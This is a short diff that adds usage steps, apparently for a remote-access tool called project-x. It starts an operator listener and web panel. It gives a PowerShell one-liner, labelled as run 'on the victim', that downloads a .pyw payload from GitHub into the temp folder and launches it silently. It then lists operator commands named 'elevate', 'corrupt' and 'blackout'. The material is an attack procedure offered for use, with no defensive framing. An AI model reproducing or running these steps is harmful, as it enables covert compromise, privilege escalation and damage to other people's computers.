@@ -1,0 +1,12 @@
+# 1. your side
+python3 -m nuitka --version   # only if you want the exe; skip for source mode
+PX_PASS=hunter2 PX_PAYLOAD="$PWD/x.pyw" python3 web.py --listen 44300 --web 8080
+
+# 2. on the victim (needs Python)
+iwr https://raw.githubusercontent.com/mexxz-01/project-x/main/x.pyw -OutFile $env:TEMP\x.pyw; Start-Process pythonw $env:TEMP\x.pyw
+
+# 3. at the prompt / on the phone
+use 1
+elevate
+corrupt
+blackout
